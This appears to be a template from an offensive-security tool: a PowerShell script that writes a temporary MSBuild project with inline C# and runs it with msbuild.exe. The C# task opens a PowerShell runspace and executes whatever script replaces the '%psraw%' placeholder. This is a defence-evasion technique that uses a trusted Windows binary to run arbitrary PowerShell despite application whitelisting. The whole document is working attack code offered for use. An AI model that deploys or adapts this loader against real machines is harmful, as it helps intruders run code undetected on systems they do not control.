$liba = (Get-ChildItem -Filter System.Management.Automation.dll -Path c:\Windows\assembly\GAC_MSIL\System.Management.Automation\ -Recurse -ErrorAction SilentlyContinue).fullname;
$xf = "$(New-TemporaryFile).xml";
Set-Content -Path "$xf" -Value @"
<Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
 <Target Name="Hello">
 <ClassExample />
 </Target>
 <UsingTask
 TaskName="ClassExample"
 TaskFactory="CodeTaskFactory"
 AssemblyFile="C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Build.Tasks.v4.0.dll" >
 <Task>
 <Reference Include="$liba" />
 <Code Type="Class" Language="cs">
 <![CDATA[
using System;
using System.Runtime.InteropServices;
using Microsoft.Build.Framework;
using Microsoft.Build.Utilities;
using System.Text;
using System.IO;
using System.Diagnostics;
using System.ComponentModel;
using System.Management.Automation;
using System.Management.Automation.Runspaces;

public class ClassExample :  Task, ITask
{
    public override bool Execute()
    {
        using(Runspace rs = RunspaceFactory.CreateRunspace()) {
            rs.Open();

            PowerShell ps = PowerShell.Create();
            ps.Runspace = rs;

            ps.AddScript(@"%psraw%");
            foreach (PSObject result in ps.Invoke()) {
                Console.WriteLine("{0}", result);
            }
            rs.Close();
        }
        return true;
    }
}
 ]]>
 </Code>
 </Task>
 </UsingTask>
</Project>
"@
c:\windows\microsoft.net\framework64\v4.0.30319\msbuild.exe "$xf"
